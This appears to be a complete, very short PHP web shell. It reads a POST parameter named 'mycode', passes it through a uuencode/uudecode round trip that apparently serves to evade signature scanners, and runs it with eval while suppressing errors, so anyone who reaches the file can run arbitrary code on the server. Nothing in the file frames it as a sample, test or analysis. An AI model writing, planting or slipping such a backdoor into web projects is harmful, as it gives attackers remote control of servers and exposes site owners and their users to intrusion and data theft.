<?php
$AVuln = $_POST['mycode'];
echo "start";
@eval(@convert_uudecode(''.convert_uuencode($AVuln)));
?>